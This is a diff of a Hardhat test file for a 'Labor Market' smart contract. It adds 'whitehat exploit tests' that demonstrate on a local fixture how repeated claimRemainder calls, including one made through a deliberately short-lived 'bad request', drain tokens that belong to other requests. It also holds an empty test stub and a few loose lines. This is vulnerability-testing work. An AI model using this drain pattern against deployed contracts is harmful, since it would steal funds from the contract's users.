@@ -140,7 +140,7 @@ describe('Labor Market', function () {
     async function createMarketWithSubmission() {
         let { market, requestId, ERC20s } = await loadFixture(createMarketWithRequest);
 
-        const [, provider] = await ethers.getSigners();
+        const [deployer, provider] = await ethers.getSigners();
 
         market = market.connect(provider);
 
@@ -152,7 +152,7 @@ describe('Labor Market', function () {
         const provide = await market.provide(requestId, 'uri');
         await provide.wait();
 
-        return { market, requestId, submissionId, ERC20s };
+        return { deployer, market, requestId, submissionId, ERC20s };
     }
 
     describe('LaborMarketFactory.sol', async () => {
@@ -399,8 +399,104 @@ describe('Labor Market', function () {
                     );
             }
         });
+
+        it.only('whitehat exploit test: recover your funds by donating', async () => {
+            // Creates a market with a submission
+            let { deployer: whitehat, market, requestId, ERC20s } = await loadFixture(createMarketWithSubmission);
+
+            // It is funded with a two sided market
+            expect(await ERC20s.pepe.balanceOf(market.address)).to.eq(ethers.utils.parseEther('100'));
+            expect(await ERC20s.usdc.balanceOf(market.address)).to.eq(ethers.utils.parseEther('100'));
+
+            const [requester] = await ethers.getSigners();
+
+            // No reviews are placed and periods end
+            await mine(10000);
+
+            // Remainder is claimed
+            await market.connect(requester).claimRemainder(requestId);
+
+            // Value remaining does not equal zero because there were unreviewed submissions.
+            // Now there is 1 PEPE and 0 USDC stuck in the contract.
+            expect(await ERC20s.pepe.balanceOf(market.address)).to.eq(ethers.utils.parseEther('1'));
+            expect(await ERC20s.usdc.balanceOf(market.address)).to.eq(ethers.utils.parseEther('0'));
+
+            // If we send another 99 PEPE to the contract, we can call claimRemainder again and get it back.
+            await ERC20s.pepe.freeMint(market.address, ethers.utils.parseEther('98'));
+            await ERC20s.usdc.freeMint(market.address, ethers.utils.parseEther('100'));
+
+            // Remainder is claimed again.
+            await market.connect(requester).claimRemainder(requestId);
+
+            // Now all the value is out of the contract and with the requester.
+            expect(await ERC20s.pepe.balanceOf(market.address)).to.eq(ethers.utils.parseEther('0'));
+            expect(await ERC20s.usdc.balanceOf(market.address)).to.eq(ethers.utils.parseEther('0'));
+        })
+
+        it.only('whitehat exploit test: drain funds of active challenges by creating a bad request', async () => {
+            const ERC20s = await loadFixture(deployCoins);
+
+            const { market, deployer } = await loadFixture(createMarket);
+
+            const [, requester] = await ethers.getSigners();
+
+            let now = await getCurrentBlockTimestamp();
+
+            // Deploy a well-intentioned request with 100:100
+            let request: LaborMarketInterface.ServiceRequestStruct = {
+                signalExp: now + 1000, // uint48
+                submissionExp: now + 2000, // uint48
+                enforcementExp: now + 3000, // uint48
+                providerLimit: 100, // uint64
+                reviewerLimit: 100, // uint64
+                pTokenProviderTotal: ethers.utils.parseEther('100'), // uint256
+                pTokenReviewerTotal: ethers.utils.parseEther('100'), // uint256
+                pTokenProvider: ERC20s.pepe.address, // IERC20
+                pTokenReviewer: ERC20s.usdc.address, // IERC20
+            };
+
+            let tx = await market.submitRequest(0, request, 'insertURIhere');
+            let receipt = await tx.wait();
+            const wellRequestId = receipt.events.find((e: any) => e.event === 'RequestConfigured').args.requestId;
+
+            now = await getCurrentBlockTimestamp();            
+
+            // Deploy a bad-intentioned request with 100:100
+            let badRequest: LaborMarketInterface.ServiceRequestStruct = {
+                signalExp: now + 10, // uint48
+                submissionExp: now + 20, // uint48
+                enforcementExp: now + 30, // uint48
+                providerLimit: 100, // uint64
+                reviewerLimit: 100, // uint64
+                pTokenProviderTotal: ethers.utils.parseEther('100'), // uint256
+                pTokenReviewerTotal: ethers.utils.parseEther('100'), // uint256
+                pTokenProvider: ERC20s.pepe.address, // IERC20
+                pTokenReviewer: ERC20s.usdc.address, // IERC20
+            };
+
+            tx = await market.submitRequest(0, badRequest, 'insertURIhere');
+            receipt = await tx.wait();
+            const badRequestId = receipt.events.find((e: any) => e.event === 'RequestConfigured').args.requestId;
+
+            await mine(40);
+
+            // Remainder of bad request id claimed.
+            await market.claimRemainder(badRequestId);
+
+            // Remainder of bad request is claimed again.
+            await market.claimRemainder(badRequestId);
+
+            // Now all the value is out of the contract and with the requester.
+            expect(await ERC20s.pepe.balanceOf(market.address)).to.eq(ethers.utils.parseEther('0'));
+            expect(await ERC20s.usdc.balanceOf(market.address)).to.eq(ethers.utils.parseEther('0'));
+        })
+
+        it('whitehat exploit test: ', async () => { 
+            // 
+        })
+
         it('call: claimRemainder()', async () => {
-            let { market, requestId, submissionId, ERC20s } = await loadFixture(createMarketWithSubmission);
+            let { deployer, market, requestId, submissionId, ERC20s } = await loadFixture(createMarketWithSubmission);
 
             const [requester, provider, reviewer] = await ethers.getSigners();
 
@@ -430,6 +526,15 @@ describe('Labor Market', function () {
                     ERC20s.usdc.balanceOf(market.address),
                     ERC20s.pepe.balanceOf(market.address),
                 ]);
+
+            await ERC20s.pepe.freeMint(deployer.address, ethers.utils.parseEther('100'));
+            await ERC20s.pepe.connect(deployer).transfer(market.address, ethers.utils.parseEther('100'));
+
+            await ERC20s.usdc.freeMint(deployer.address, ethers.utils.parseEther('100'));
+            await ERC20s.usdc.connect(deployer).transfer(market.address, ethers.utils.parseEther('100'));
+
+            await market.connect(requester).claimRemainder(requestId);
+            await claimRemainder.wait();
 
             // console.log('net change', requesterPepeBalanceBefore, requesterPepeBalanceAfter);
             // console.log('reviewer payment', requesterUsdcBalanceBefore, requesterUsdcBalanceAfter);
